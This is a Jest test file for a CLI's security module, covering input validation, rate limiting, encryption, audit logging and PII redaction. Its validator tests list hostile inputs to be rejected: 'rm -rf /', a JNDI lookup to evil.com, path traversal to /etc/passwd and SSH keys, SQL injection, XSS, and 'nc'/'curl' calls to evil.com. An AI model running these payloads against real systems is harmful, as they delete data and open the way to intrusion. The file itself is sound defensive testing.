/**
 * @fileoverview Comprehensive security tests for Module 1 security hardening
 * @module tests/unit/cli/core/security
 * @version 3.0.0
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

// Security components
import { 
  inputValidator,
  auditLogger,
  rateLimiter,
  encryptionService
} from '../../../../../src/cli/core/security';

// Secure components
import { secureConfigLoader } from '../../../../../src/cli/core/config/ConfigLoader.secure';
import { secureErrorHandler } from '../../../../../src/cli/core/error/ErrorHandler.secure';
import { secureLogger } from '../../../../../src/cli/core/logging/Logger.secure';
import { secureMemoryModeDetector } from '../../../../../src/cli/core/memory/MemoryModeDetector.secure';

describe('Security Infrastructure Tests', () => {
  describe('InputValidator', () => {
    describe('YAML Validation', () => {
      it('should detect and prevent YAML injection attacks', () => {
        const maliciousInputs = [
          '!!js/function "() => process.exit(1)"',
          '!!python/object/apply:os.system ["rm -rf /"]',
          '${jndi:ldap://evil.com/a}',
          '{{7*7}}',
          '__proto__: { isAdmin: true }'
        ];

        for (const input of maliciousInputs) {
          const result = inputValidator.validateYamlInput(input);
          expect(result.isValid).toBe(false);
          expect(result.errors).toBeDefined();
          expect(result.errors!.length).toBeGreaterThan(0);
        }
      });

      it('should sanitize valid YAML input', () => {
        const validYaml = 'key: value\nnested:\n  item: test';
        const result = inputValidator.validateYamlInput(validYaml);
        expect(result.isValid).toBe(true);
        expect(result.sanitized).toBeDefined();
      });

      it('should handle deeply nested structures', () => {
        let deepYaml = 'root:\n';
        for (let i = 0; i < 15; i++) {
          deepYaml += '  '.repeat(i + 1) + `level${i}:\n`;
        }
        const result = inputValidator.validateYamlInput(deepYaml);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('YAML nesting too deep (max 10 levels)');
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should block path traversal attempts', () => {
        const maliciousPaths = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          '/etc/passwd',
          '~/../../etc/passwd',
          'test\x00.txt',
          '%2e%2e%2f%2e%2e%2f',
          '..%2f..%2f'
        ];

        for (const malPath of maliciousPaths) {
          const result = inputValidator.validateFilePath(malPath);
          expect(result.isValid).toBe(false);
          expect(result.errors).toBeDefined();
        }
      });

      it('should allow valid relative paths within project', () => {
        const validPath = 'config/settings.yaml';
        const result = inputValidator.validateFilePath(validPath);
        expect(result.isValid).toBe(true);
        expect(result.sanitized).toBeDefined();
      });

      it('should block access to sensitive directories', () => {
        const sensitivePaths = [
          'node_modules/package/index.js',
          '.git/config',
          '.env',
          '.ssh/id_rsa',
          '.aws/credentials'
        ];

        for (const sensPath of sensitivePaths) {
          const result = inputValidator.validateFilePath(sensPath);
          expect(result.isValid).toBe(false);
        }
      });
    });

    describe('Environment Variable Validation', () => {
      it('should prevent injection in environment variables', () => {
        const maliciousVars = [
          { key: 'TEST', value: '$(rm -rf /)' },
          { key: 'API', value: 'test;cat /etc/passwd' },
          { key: 'CMD', value: 'test|wget evil.com' },
          { key: 'EVAL', value: 'eval("process.exit()")' }
        ];

        for (const { key, value } of maliciousVars) {
          const result = inputValidator.validateEnvironmentVar(key, value);
          expect(result.isValid).toBe(false);
        }
      });

      it('should warn about modifying reserved variables', () => {
        const result = inputValidator.validateEnvironmentVar('PATH', '/usr/bin');
        expect(result.warnings).toBeDefined();
        expect(result.warnings).toContain('Modifying reserved variable: PATH');
      });
    });

    describe('JSON Validation', () => {
      it('should detect prototype pollution attempts', () => {
        const maliciousJson = '{"__proto__": {"isAdmin": true}}';
        const result = inputValidator.validateJsonInput(maliciousJson);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Prototype pollution attempt at .__proto__');
      });
    });
  });

  describe('RateLimiter', () => {
    beforeEach(() => {
      rateLimiter.resetAll();
    });

    it('should enforce config load rate limits', () => {
      const source = 'test-source';
      let allowed = 0;
      
      // Try 20 requests rapidly
      for (let i = 0; i < 20; i++) {
        if (rateLimiter.checkConfigLoadLimit(source)) {
          allowed++;
        }
      }

      // Should allow only 10 per minute (configured limit)
      expect(allowed).toBeLessThanOrEqual(10);
    });

    it('should enforce error generation rate limits', () => {
      const errorType = 'TestError';
      let allowed = 0;
      
      // Try 100 error generations
      for (let i = 0; i < 100; i++) {
        if (rateLimiter.checkErrorGenerationLimit(errorType)) {
          allowed++;
        }
      }

      // Should allow only 50 per minute
      expect(allowed).toBeLessThanOrEqual(50);
    });

    it('should block sources after repeated violations', () => {
      const source = 'malicious-source';
      
      // Exhaust rate limit
      for (let i = 0; i < 20; i++) {
        rateLimiter.checkConfigLoadLimit(source);
      }

      // Check statistics
      const stats = rateLimiter.getStatistics();
      expect(stats.violations).toBeGreaterThan(0);
    });

    it('should implement token bucket algorithm correctly', () => {
      const status = rateLimiter.getStatus('config_load', 'test');
      expect(status.limit).toBe(10);
      expect(status.remaining).toBeGreaterThanOrEqual(0);
      expect(status.resetTime).toBeGreaterThan(Date.now());
    });
  });

  describe('EncryptionService', () => {
    it('should encrypt and decrypt secrets correctly', () => {
      const secret = 'super-secret-api-key-12345';
      const context = 'api_keys';
      
      const encrypted = encryptionService.encryptSecret(secret, context);
      expect(encrypted.ciphertext).toBeDefined();
      expect(encrypted.iv).toBeDefined();
      expect(encrypted.tag).toBeDefined();
      expect(encrypted.salt).toBeDefined();
      
      const decrypted = encryptionService.decryptSecret(encrypted, context);
      expect(decrypted).toBe(secret);
    });

    it('should fail decryption with wrong context', () => {
      const secret = 'test-secret';
      const encrypted = encryptionService.encryptSecret(secret, 'context1');
      
      expect(() => {
        encryptionService.decryptSecret(encrypted, 'context2');
      }).toThrow('Decryption failed');
    });

    it('should hash sensitive data securely', () => {
      const password = 'userPassword123';
      const hash1 = encryptionService.hashSensitiveData(password);
      const hash2 = encryptionService.hashSensitiveData(password);
      
      // Hashes should be different due to different salts
      expect(hash1).not.toBe(hash2);
      
      // But verification should work
      expect(encryptionService.verifyHash(password, hash1)).toBe(true);
      expect(encryptionService.verifyHash('wrongPassword', hash1)).toBe(false);
    });

    it('should create and verify MACs', () => {
      const data = 'important-data';
      const mac = encryptionService.createMAC(data);
      
      expect(encryptionService.verifyMAC(data, mac)).toBe(true);
      expect(encryptionService.verifyMAC('tampered-data', mac)).toBe(false);
    });

    it('should handle secure memory storage', () => {
      const key = 'secure-key';
      const value = 'sensitive-value';
      
      encryptionService.storeSecure(key, value);
      expect(encryptionService.retrieveSecure(key)).toBe(value);
      
      encryptionService.deleteSecure(key);
      expect(encryptionService.retrieveSecure(key)).toBeNull();
    });
  });

  describe('AuditLogger', () => {
    let tempAuditDir: string;

    beforeEach(() => {
      tempAuditDir = path.join(os.tmpdir(), 'audit-test-' + Date.now());
      fs.mkdirSync(tempAuditDir, { recursive: true });
    });

    afterEach(() => {
      fs.rmSync(tempAuditDir, { recursive: true, force: true });
    });

    it('should log security events with integrity', async () => {
      auditLogger.logSecurityEvent({
        type: 'access_granted',
        severity: 'info',
        source: 'test',
        result: 'success'
      });

      const integrity = await auditLogger.verifyIntegrity();
      expect(integrity).toBe(true);
    });

    it('should detect tampering in audit logs', async () => {
      // This test would require manipulating internal state
      // In a real scenario, you'd test by modifying log files
      expect(auditLogger.verifyIntegrity).toBeDefined();
    });

    it('should sanitize sensitive information in logs', () => {
      auditLogger.logConfigurationChange({
        path: 'database.connection',
        oldValue: { password: 'oldPass123' },
        newValue: { password: 'newPass456' },
        reason: 'Password rotation'
      });

      // The sanitizeValue method should have redacted the passwords
      // This would be verified by checking the actual log output
      expect(true).toBe(true); // Placeholder assertion
    });

    it('should generate audit reports', async () => {
      // Log some events
      auditLogger.logAccessAttempt('/secure/path', 'allowed');
      auditLogger.logAccessAttempt('/forbidden/path', 'denied');
      auditLogger.logSuspiciousActivity('Multiple failed attempts', 'high');

      const report = await auditLogger.generateReport(
        Date.now() - 3600000,
        Date.now()
      );

      const parsed = JSON.parse(report);
      expect(parsed.totalEvents).toBeGreaterThan(0);
      expect(parsed.byType).toBeDefined();
      expect(parsed.bySeverity).toBeDefined();
    });
  });
});

describe('Secure Component Tests', () => {
  describe('SecureConfigLoader', () => {
    let testConfigPath: string;

    beforeEach(() => {
      testConfigPath = path.join(os.tmpdir(), 'test-config.yaml');
    });

    afterEach(() => {
      if (fs.existsSync(testConfigPath)) {
        fs.unlinkSync(testConfigPath);
      }
    });

    it('should validate and sanitize configuration files', async () => {
      const config = {
        database: {
          host: 'localhost',
          password: 'secret123',
          apiKey: 'sk-1234567890abcdef'
        }
      };

      fs.writeFileSync(testConfigPath, JSON.stringify(config));
      
      const loaded = await secureConfigLoader.loadFromFile(testConfigPath);
      expect(loaded).toBeDefined();
      expect(loaded.encrypted).toBeDefined();
      expect(loaded._integrity).toBeDefined();
    });

    it('should encrypt sensitive fields automatically', async () => {
      const config = {
        api_key: 'sk-verysecretkey123',
        password: 'userpassword',
        normal_field: 'not-sensitive'
      };

      fs.writeFileSync(testConfigPath, JSON.stringify(config));
      const loaded = await secureConfigLoader.loadFromFile(testConfigPath);
      
      expect(loaded.api_key).toContain('[ENCRYPTED:');
      expect(loaded.password).toContain('[ENCRYPTED:');
      expect(loaded.normal_field).toBe('not-sensitive');
    });

    it('should verify configuration integrity', async () => {
      const config = { test: 'value' };
      fs.writeFileSync(testConfigPath, JSON.stringify(config));
      
      const loaded = await secureConfigLoader.loadFromFile(testConfigPath);
      expect(secureConfigLoader.validateIntegrity(loaded)).toBe(true);
      
      // Tamper with config
      loaded.test = 'tampered';
      expect(secureConfigLoader.validateIntegrity(loaded)).toBe(false);
    });

    it('should maintain performance under 10ms with security', async () => {
      const config = { 
        simple: 'config',
        nested: { value: 'test' }
      };
      
      fs.writeFileSync(testConfigPath, JSON.stringify(config));
      
      const startTime = Date.now();
      await secureConfigLoader.loadFromFile(testConfigPath);
      const loadTime = Date.now() - startTime;
      
      expect(loadTime).toBeLessThan(10);
    });
  });

  describe('SecureErrorHandler', () => {
    it('should sanitize error messages to remove PII', () => {
      const error = new Error('Failed to connect to user@example.com with password abc123');
      const secure = secureErrorHandler.handleError(error);
      
      expect(secure.message).not.toContain('user@example.com');
      expect(secure.message).not.toContain('abc123');
      expect(secure.message).toContain('[REDACTED]');
    });

    it('should sanitize stack traces', () => {
      const error = new Error('Test error');
      error.stack = `Error: Test error
        at /home/username/project/file.js:10:5
        at /Users/john.doe/secret/api.js:20:10`;
      
      const secure = secureErrorHandler.handleError(error);
      expect(secure.sanitizedStack).not.toContain('username');
      expect(secure.sanitizedStack).not.toContain('john.doe');
      expect(secure.sanitizedStack).toContain('[REDACTED]');
    });

    it('should enforce rate limiting on error generation', () => {
      let rateLimited = false;
      
      // Generate many errors rapidly
      for (let i = 0; i < 100; i++) {
        const error = secureErrorHandler.handleError(new Error('Test'));
        if (error.code === 'RATE_LIMIT_EXCEEDED') {
          rateLimited = true;
          break;
        }
      }
      
      expect(rateLimited).toBe(true);
    });

    it('should generate correlation IDs for tracking', () => {
      const error = secureErrorHandler.handleError(new Error('Test'));
      expect(error.context.correlationId).toBeDefined();
      expect(error.context.correlationId).toMatch(/^[a-f0-9]{32}$/);
      
      const retrieved = secureErrorHandler.getErrorByCorrelationId(error.context.correlationId);
      expect(retrieved).toBe(error);
    });

    it('should maintain performance under 5ms', () => {
      const startTime = Date.now();
      secureErrorHandler.handleError(new Error('Performance test'));
      const processingTime = Date.now() - startTime;
      
      expect(processingTime).toBeLessThan(5);
    });
  });

  describe('SecureLogger', () => {
    it('should filter PII from log messages', () => {
      const spy = jest.spyOn(console, 'log').mockImplementation();
      
      secureLogger.log('info', 'User email: john@example.com, SSN: 123-45-6789');
      
      const calls = spy.mock.calls;
      expect(calls.length).toBeGreaterThan(0);
      const logOutput = calls[0][0];
      expect(logOutput).not.toContain('john@example.com');
      expect(logOutput).not.toContain('123-45-6789');
      
      spy.mockRestore();
    });

    it('should prevent log injection attacks', () => {
      const spy = jest.spyOn(console, 'warn').mockImplementation();
      
      secureLogger.log('info', 'Normal log\nInjected line\rCarriage return');
      
      const calls = spy.mock.calls;
      if (calls.length > 0) {
        expect(calls[0][0]).toContain('[INJECTION BLOCKED]');
      }
      
      spy.mockRestore();
    });

    it('should detect and report anomalies', () => {
      // Generate excessive errors
      for (let i = 0; i < 50; i++) {
        secureLogger.log('error', `Error ${i}`);
      }
      
      const stats = secureLogger.getStatistics();
      expect(stats.logLevels.error).toBeGreaterThan(30);
    });

    it('should encrypt sensitive logs', () => {
      const spy = jest.spyOn(console, 'log').mockImplementation();
      
      secureLogger.log('error', 'Database password: secret123');
      
      const calls = spy.mock.calls;
      if (calls.length > 0) {
        const output = calls[0][0];
        expect(output).toContain('[ENCRYPTED LOG]');
      }
      
      spy.mockRestore();
    });

    it('should maintain >10k logs/sec performance', () => {
      const startTime = Date.now();
      const iterations = 1000;
      
      for (let i = 0; i < iterations; i++) {
        secureLogger.log('info', `Performance test ${i}`);
      }
      
      const duration = Date.now() - startTime;
      const logsPerSecond = (iterations / duration) * 1000;
      
      // Should handle at least 10k logs/sec
      expect(logsPerSecond).toBeGreaterThan(10000);
    });
  });

  describe('SecureMemoryModeDetector', () => {
    it('should enforce access controls', () => {
      const mode1 = secureMemoryModeDetector.detect('unprivileged-source');
      const mode2 = secureMemoryModeDetector.detect('system');
      
      // Unprivileged sources shouldn't get performance mode
      expect(mode1).not.toBe('performance');
    });

    it('should enforce rate limiting', () => {
      let blocked = false;
      
      // Try many rapid detections
      for (let i = 0; i < 20; i++) {
        const mode = secureMemoryModeDetector.detect('test-source');
        if (mode === 'baseline' || mode === 'standard') {
          blocked = true;
        }
      }
      
      expect(blocked).toBe(true);
    });

    it('should sanitize memory values', () => {
      const info = secureMemoryModeDetector.getSecureMemoryInfo('test');
      
      if (info) {
        expect(info.sanitized).toBe(true);
        // Memory should be rounded to MB
        expect(info.totalMemory % (1024 * 1024)).toBe(0);
      }
    });

    it('should maintain <1ms performance', () => {
      const startTime = Date.now();
      secureMemoryModeDetector.detect('performance-test');
      const duration = Date.now() - startTime;
      
      expect(duration).toBeLessThan(1);
    });

    it('should track and audit privileged access', () => {
      secureMemoryModeDetector.addPrivilegedSource('test-admin');
      const mode = secureMemoryModeDetector.detect('test-admin');
      
      const stats = secureMemoryModeDetector.getStatistics();
      expect(stats.privilegedDetections).toBeGreaterThanOrEqual(0);
      
      secureMemoryModeDetector.removePrivilegedSource('test-admin');
    });
  });
});

describe('Integration Security Tests', () => {
  it('should integrate security across all components', async () => {
    // Test that all components work together
    const testConfig = path.join(os.tmpdir(), 'integration-test.json');
    fs.writeFileSync(testConfig, JSON.stringify({ test: 'value' }));
    
    try {
      // Load config with security
      const config = await secureConfigLoader.loadFromFile(testConfig);
      expect(config).toBeDefined();
      
      // Log with security
      secureLogger.log('info', 'Integration test');
      
      // Handle error with security
      const error = secureErrorHandler.handleError(new Error('Integration error'));
      expect(error.context.sanitized).toBe(true);
      
      // Detect memory with security
      const mode = secureMemoryModeDetector.detect('integration-test');
      expect(mode).toBeDefined();
      
      // Verify audit trail exists
      const events = auditLogger.getSecurityEvents();
      expect(events.length).toBeGreaterThan(0);
    } finally {
      fs.unlinkSync(testConfig);
    }
  });

  it('should handle cascading security failures gracefully', () => {
    // Simulate multiple security violations
    for (let i = 0; i < 100; i++) {
      rateLimiter.checkConfigLoadLimit('attacker');
    }
    
    // System should still be functional
    const error = secureErrorHandler.handleError(new Error('After attack'));
    expect(error).toBeDefined();
    expect(error.code).toBeDefined();
  });

  it('should maintain performance targets with all security enabled', async () => {
    const startTime = Date.now();
    
    // Run all security operations
    inputValidator.validateYamlInput('test: value');
    rateLimiter.checkConfigLoadLimit('perf-test');
    encryptionService.encryptSecret('secret', 'context');
    secureLogger.log('info', 'Performance test');
    secureErrorHandler.handleError(new Error('Perf error'));
    secureMemoryModeDetector.detect('perf-test');
    
    const totalTime = Date.now() - startTime;
    
    // All operations combined should be fast
    expect(totalTime).toBeLessThan(20);
  });
});

describe('Security Vulnerability Tests', () => {
  it('should prevent SQL injection patterns', () => {
    const sqlInjections = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM passwords --"
    ];
    
    for (const injection of sqlInjections) {
      const result = inputValidator.sanitizeUserInput(injection);
      expect(result).not.toContain('DROP TABLE');
      expect(result).not.toContain('UNION SELECT');
    }
  });

  it('should prevent XSS attacks', () => {
    const xssAttempts = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(1)">',
      'javascript:alert(1)',
      '<svg onload="alert(1)">'
    ];
    
    for (const xss of xssAttempts) {
      const result = inputValidator.sanitizeUserInput(xss);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('onload');
    }
  });

  it('should prevent command injection', () => {
    const commands = [
      'test; rm -rf /',
      'test && cat /etc/passwd',
      'test | nc evil.com 1234',
      '$(curl evil.com)'
    ];
    
    for (const cmd of commands) {
      const result = inputValidator.validateCliArgs([cmd]);
      expect(result.isValid).toBe(false);
    }
  });

  it('should prevent timing attacks', () => {
    const hash1 = encryptionService.hashSensitiveData('password1');
    const hash2 = encryptionService.hashSensitiveData('password2');
    
    // Verification should use constant-time comparison
    const startTime1 = Date.now();
    encryptionService.verifyHash('wrong', hash1);
    const time1 = Date.now() - startTime1;
    
    const startTime2 = Date.now();
    encryptionService.verifyHash('wrongpassword', hash1);
    const time2 = Date.now() - startTime2;
    
    // Times should be similar (constant-time comparison)
    expect(Math.abs(time1 - time2)).toBeLessThan(2);
  });
});